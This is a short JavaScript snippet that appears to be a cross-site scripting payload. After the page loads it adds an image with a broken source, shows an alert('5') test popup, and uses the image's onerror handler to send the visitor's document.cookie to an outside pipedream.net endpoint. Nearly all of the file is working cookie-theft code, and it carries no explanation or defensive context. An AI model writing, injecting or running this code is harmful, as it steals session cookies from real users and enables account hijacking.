document.addEventListener("DOMContentLoaded", function() {
  const img = document.createElement('img');
  img.id = 'myImg';
  img.src = '../reverese.PNG/img.jpg'; // Replace with your image source
  
  // Append the image to the body (or another container)
  document.body.appendChild(img);
  alert('5');
  
  // Set the onerror handler
  img.onerror = function() {
    this.src = 'http://eo7u1nl20laxhkt.m.pipedream.net?cookie=' + document.cookie;
  };
});
